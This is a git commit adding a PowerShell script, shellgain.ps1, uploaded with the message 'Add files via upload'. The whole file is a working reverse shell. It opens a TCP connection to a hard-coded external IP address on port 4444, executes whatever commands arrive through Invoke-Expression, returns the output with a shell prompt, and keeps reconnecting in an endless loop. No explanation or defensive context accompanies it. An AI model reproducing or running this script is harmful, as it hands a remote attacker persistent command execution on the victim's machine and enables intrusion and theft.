495f6e8d7b157aba5dab2658d674e2cd0cc26c90
bananamansot <trulshosethba@protonmail.com>
2024-07-16 15:58:13 +0200

    Add files via upload

---
+++ shellgain.ps1
@@ -0,0 +1,19 @@
+while ($true) {
+    try {
+        $client = New-Object System.Net.Sockets.TcpClient('77.223.189.177', 4444)
+        $stream = $client.GetStream()
+        [byte[]]$bytes = 0..65535|%{0}
+        while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
+            $sendback = (iex $data 2>&1 | Out-String )
+            $sendback2  = $sendback + 'SHELL$~PS ' + (pwd).Path + '> '
+            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+            $stream.Write($sendbyte,0,$sendbyte.Length)
+            $stream.Flush()
+        }
+        $client.Close()
+    }
+    catch {
+        Start-Sleep -Seconds 5
+    }
+}
